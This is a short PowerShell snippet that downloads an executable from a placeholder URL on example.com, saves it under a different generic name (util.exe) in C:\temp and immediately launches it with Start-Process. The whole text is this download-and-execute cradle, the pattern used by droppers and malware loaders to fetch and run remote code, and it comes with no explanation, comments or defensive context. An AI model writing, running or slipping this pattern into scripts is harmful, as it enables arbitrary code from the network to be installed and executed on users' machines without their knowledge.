$url = "http://example.com/app.exe"
$fileName = "util.exe"

(New-Object System.Net.WebClient).DownloadFile("$url", "C:\temp\$fileName"); Start-Process "C:\temp\$fileName"

